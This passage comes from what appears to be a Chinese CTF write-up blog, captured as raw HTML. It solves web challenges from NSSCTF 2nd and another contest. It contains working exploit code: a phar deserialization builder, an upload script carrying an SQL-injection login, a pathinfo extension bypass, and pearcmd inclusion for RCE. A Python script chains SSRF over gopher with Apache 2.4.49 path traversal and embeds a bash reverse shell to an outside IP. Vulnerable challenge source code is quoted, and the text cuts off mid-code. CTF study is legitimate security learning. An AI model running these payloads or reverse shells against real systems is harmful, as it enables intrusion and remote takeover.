class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后配合脚本 上传上去 偷的<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247493970&idx=1&sn=9a20317104c56bd5060763e1461908ea&chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&mpshare=1&scene=23&srcid=07256NyrGaLqc95MJJrprw2j&sharer_sharetime=1690256252504&sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493970&amp;idx=1&amp;sn=9a20317104c56bd5060763e1461908ea&amp;chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&amp;mpshare=1&amp;scene=23&amp;srcid=07256NyrGaLqc95MJJrprw2j&amp;sharer_sharetime=1690256252504&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd</a> 师傅真的太强了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 获取当前脚本文件的目录路径</span></span><br><span class="line">current_directory = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line"><span class="comment"># 构建文件路径</span></span><br><span class="line">image_path = os.path.join(current_directory, <span class="string">&#x27;1.jpg&#x27;</span>)</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">burp0_url = <span class="string">&quot;http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/?&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;su&quot;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, <span class="built_in">open</span>(image_path, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;x&#x27; or 1=1 or &#x27;=&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;登录&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(burp0_url, cookies=burp0_cookies, files=files, data=data, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment">#burp0_url = &quot;http://8ea14a59-3600-4799-a424-95e815a3d71f.node4.buuoj.cn:81/?file=phar:///var/www/html/1.jpg&amp;todo=md5&quot;</span></span><br><span class="line"><span class="comment">#res = requests.post(burp0_url,              cookies=burp0_cookies,data=data,proxies=proxy)</span></span><br><span class="line"><span class="comment">#print(res.text)</span></span><br></pre></td></tr></table></figure><p>先登录+上传文件 然后登录+phar包含</p><p>都是同时进行每一步</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284835271-ef78e974-b80b-42d8-ba3a-198e46ed4719.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284900264-277755df-bda5-45f3-8a7d-7ffc1906ae9e.png" alt="img"></p><p>又学到了 之后要好好学一下requests这个库和其他常用库</p><h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1><p>熊海cms v1.0 文件包含+pearcmd   第一次见</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690190505171-21e3d749-3951-4d74-ab6a-360007a73ddf.png" alt="img"></p><p>关于pearcmd:</p><p><a href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p><p>payload:</p><p>这个pearcmd的文件路径很难找 要一个一个试</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1706505713947-c5108f87-f1b4-48d5-aa6f-e1d1cfc8aef4.png" alt="img"></p><p><code>?r=../../../../../../../tmp/123</code>访问rce就行了</p><p>反正我没复现成功 感觉是赛后靶机和比赛的不一样 rce不了 还是我姿势不对 无语了</p><h1 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h1><p>考点：django session pickle反序列化 </p><p> 不太会 以后再来看 还是第一次见</p><h1 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h1><p>HTTP&#x2F;2??????? 6</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF 2nd WP与学习</title>
      <link href="/post/c7a57718.html"/>
      <url>/post/c7a57718.html</url>
      
        <content type="html"><![CDATA[<p>NSSCTF 2nd WP与学习</p><span id="more"></span><h1 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">     <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">     <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">         <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>一道文件上传的题目，主要就是后缀名怎么去绕过pathinfo()函数</p><p>参考以下文章</p><p><a href="https://www.freesion.com/article/7470682764/">https://www.freesion.com/article/7470682764/</a></p><p><a href="https://www.anquanke.com/post/id/253383">https://www.anquanke.com/post/id/253383</a></p><p>在操作系统中，都是禁止使用&#x2F;作为文件名的，但是不知道为什么后面加一个.就可以成功的写入1.php了。</p><p>$pathinfo[extension]&#x3D;pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。</p><p> 所以用<code>/.</code>绕过就行 记得要url编码一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1706504612399-99026929-5842-4973-b818-0214011ec48c.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693108794590-ca64554b-c13d-4a28-b22a-be5854ad5ec9.png" alt="img"></p><p>上传成功后 就是rce即可</p><h1 id="2周年快乐！"><a href="#2周年快乐！" class="headerlink" title="2周年快乐！"></a>2周年快乐！</h1><p>进入题目中win12系统 用里面的cmd发个<code>curl https://www.nssctf.cn/flag</code>就能在nss站内收到flag邮件了</p><h1 id="MyBox"><a href="#MyBox" class="headerlink" title="MyBox"></a>MyBox</h1><p>非预期了 直接<code>file:///proc/1/environ</code>flag就在环境变量中</p><h1 id="MyBox-revenge"><a href="#MyBox-revenge" class="headerlink" title="MyBox(revenge)"></a>MyBox(revenge)</h1><p>一道gopher协议 打apache2.4.49 ssrf+路径穿越RCE的题目</p><p>做题根本想不到</p><p>首先<code>file:///app/app.py</code>获得源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, redirect</span><br><span class="line"><span class="keyword">import</span> requests, socket, struct</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> not request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;url&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&#x27;/?url=dosth&#x27;</span>)</span><br><span class="line">    url = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url.<span class="title function_">startswith</span>(<span class="string">&#x27;file://&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">in</span> url or <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> <span class="attr">url</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;no!&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="title function_">open</span>(url[<span class="number">7</span>:], <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">            data = f.<span class="title function_">read</span>()</span><br><span class="line">            <span class="keyword">if</span> url[<span class="number">7</span>:] == <span class="string">&#x27;/app/app.py&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> <span class="attr">data</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    elif url.<span class="title function_">startswith</span>(<span class="string">&#x27;http://localhost/&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> requests.<span class="title function_">get</span>(url).<span class="property">text</span></span><br><span class="line">    elif url.<span class="title function_">startswith</span>(<span class="string">&#x27;mybox://127.0.0.1:&#x27;</span>):</span><br><span class="line">        port, content = url[<span class="number">18</span>:].<span class="title function_">split</span>(<span class="string">&#x27;/_&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">        s = socket.<span class="title function_">socket</span>(socket.<span class="property">AF_INET</span>, socket.<span class="property">SOCK_STREAM</span>)</span><br><span class="line">        s.<span class="title function_">settimeout</span>(<span class="number">5</span>)</span><br><span class="line">        s.<span class="title function_">connect</span>((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="title function_">int</span>(port)))</span><br><span class="line">        s.<span class="title function_">send</span>(parse.<span class="title function_">unquote</span>(content).<span class="title function_">encode</span>())</span><br><span class="line">        res = b<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data = s.<span class="title function_">recv</span>(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="attr">data</span>:</span><br><span class="line">                res += data</span><br><span class="line">            <span class="attr">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">run</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">827</span>)</span><br></pre></td></tr></table></figure><p>先发包看看80端口 偷的大佬的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mybox://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25200%250D%250A%250D%250A%250D%250A</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693302700270-2d5a5ce7-2e33-42ce-97bd-3b9900eb3611.png" alt="img"></p><p>显示apahce2.4.49 然后是一个gopher+路径穿越rce</p><p>参考：<a href="https://classic0796.com/index.php/archives/6/">https://classic0796.com/index.php/archives/6/</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693305404147-d17547c7-5ee8-49b1-a441-776cbe6dc0ca.jpeg" alt="img"></p><p>可以构造这种请求包来rce</p><p>直接用god脚本 不用手动去构造<code>%0D%0A</code> </p><p>还有一个小点是那个<code>_</code> 一定要加不然会将之后数据第一个字符吞了</p><p>参考:<a href="https://cloud.tencent.com/developer/article/1610645">https://cloud.tencent.com/developer/article/1610645</a></p><p>还有一个小点就是我们都找到三个双引号或者单引号在python中是注释符 但是也可以被当作用来括普通字符串的qwq</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.<span class="property">parse</span> <span class="keyword">import</span> quote</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: curl/7.68.0</span></span><br><span class="line"><span class="string">Content-Length:59</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo;bash -c &quot;</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">8.130</span><span class="number">.34</span><span class="number">.53</span>/<span class="number">7777</span> &lt;&amp;<span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">#<span class="attr">http</span>:<span class="comment">//node6.anna.nssctf.cn:28949/?url=mybox://127.0.0.1:80/_POST%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520curl/7.68.0%250D%250AContent-Length%253A59%250D%250A%250D%250Aecho%253Bbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/114.116.119.253/7777%2520%253C%25261%2522%250D%250A</span></span><br><span class="line">tmp = <span class="title function_">quote</span>(test)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line"><span class="title function_">print</span>(<span class="keyword">new</span>)</span><br><span class="line">result=<span class="string">&#x27;_&#x27;</span>+<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line">#post</span><br><span class="line">#result = <span class="string">&#x27;_&#x27;</span>+<span class="keyword">new</span></span><br><span class="line">common=<span class="string">&quot;gopher://127.0.0.1:80/&quot;</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">quote</span>(common)+result)</span><br></pre></td></tr></table></figure><h1 id="MyJs"><a href="#MyJs" class="headerlink" title="MyJs"></a>MyJs</h1><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="title function_">express</span>()</span><br><span class="line">  .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">  .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">  .<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">  .<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">  .<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">  &#125;))</span><br><span class="line">  .<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;username, password, token&#125; = req.<span class="property">body</span>;</span><br><span class="line">      <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line">      <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">if</span> (username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = &#123;</span><br><span class="line">          <span class="attr">username</span>: username,</span><br><span class="line">          <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">all</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;username, password&#125; = req.<span class="property">body</span>;</span><br><span class="line">      <span class="keyword">if</span> (!username || username == <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span 